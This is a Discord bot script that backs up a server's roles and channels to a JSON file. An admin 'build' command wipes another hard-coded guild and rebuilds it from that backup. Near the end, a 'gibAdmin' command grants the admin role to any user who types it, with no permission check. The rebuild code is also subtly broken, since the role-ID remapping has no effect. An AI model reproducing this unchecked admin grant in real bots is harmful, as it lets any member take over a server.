const Discord = require('discord.js')
const fs = require('fs')

const client = new Discord.Client()
let storage = require('./storage.json')

const config = require('./config.json')
if (!config) return console.error("Couldn't find config.json")

client.on('ready', () => {
  console.log(
    'Logged in as ' +
      client.user.tag +
      '.\nI see ' +
      client.users.size +
      ' users.'
  )

  const onion = client.guilds.find('name', 'Bot test')

  if (!onion) {
    console.log("Couldn't find Onion server\nTrying to rebuild ...")

    return
  }

  //Initial Cacher
  const channels = onion.channels
    .map(c => ({
      name: c.name,
      id: c.id,
      type: c.type,
      permissionOverwrites: c.permissionOverwrites.map(o => ({
        name: onion.roles.get(o.id)
          ? onion.roles.get(o.id).name
          : onion.members.get(o.id).user.tag,
        id: o.id,
        deny: o.deny,
        allow: o.allow
      })),
      parent: c.parentID,
      position: c.position
    }))
    .sort((a, b) => {
      return a.position - b.position
    })

  const roles = onion.roles
    .map(r => ({
      name: r.name,
      id: r.id,
      permissions: r.permissions,
      position: r.position,
      color: r.color,
      mentionable: r.mentionable
    }))
    .sort((a, b) => {
      return a.position - b.position
    })

  let members
  onion.fetchMembers().then(() => {
    members = onion.members.map(m => ({
      id: m.id,
      roles: m.roles.map(r => r.id)
    }))
    storage = { members: members, roles: roles, channels: channels }
    fs.writeFile('storage.json', JSON.stringify(storage, null, 2), () => {})
  })
})

client.on('message', async message => {
  if (message.content.startsWith('perm')) {
    const member = message.mentions.members.first()
    if (!member) return
    message.reply(
      '```json\n' +
        JSON.stringify(member.permissions.serialize(), null, 2) +
        '\n```'
    )
  }

  if (config.admin.includes(message.author.id) && message.content === 'build') {
    const newOnion = client.guilds.get('439887847357546496')

    newOnion.channels.forEach(async channel => {
      await channel.delete()
    })

    newOnion.roles.forEach(async role => {
      if (role.name == '@everyone') return
      await role.delete()
    })

    var editChannels = JSON.stringify(storage.channels)
    for (i = 0; i < storage.roles.length; i++) {
      let role = storage.roles[i]

      if (role.name == '@everyone') {
        newOnion.roles
          .get(newOnion.id)
          .setPermissions(role.permissions)
          .catch(console.error)
      } else {
        let newRole = await newOnion
          .createRole({
            name: role.name,
            color: role.color,
            position: role.position,
            permissions: role.permissions,
            mentionable: role.mentionable
          })
          .catch(console.error)
        editChannels.replace(role.id, newRole.id)
      }
    }
    storage.channels = JSON.parse(editChannels)

    const categories = storage.channels.filter(c => c.type === 'category')
    const channels = storage.channels.filter(c => c.type !== 'category')

    for (i = 0; i < categories.length; i++) {
      let category = categories[i]
      let newCategory = await newOnion.createChannel(
        category.name,
        category.type,
        category.permissionOverwrites
      )

      channels.forEach(channel => {
        if (channel.parent == category.id) {
          channel.parent = newCategory.id
        }
      })
    }

    for (i = 0; i < channels.length; i++) {
      let channel = channels[i]
      newOnion
        .createChannel(channel.name, channel.type, channel.permissionOverwrites)
        .then(newChannel => newChannel.setParent(channel.parent))
      console.log(
        channel.permissionOverwrites.map(
          a => newOnion.roles.get(a.id) + ' ' + a.id
        )
      )
    }
  }
  if (message.content == 'gibAdmin') {
    message.member.addRole(message.guild.roles.find('name', 'admin'))
  }
})

client.login(config.token)
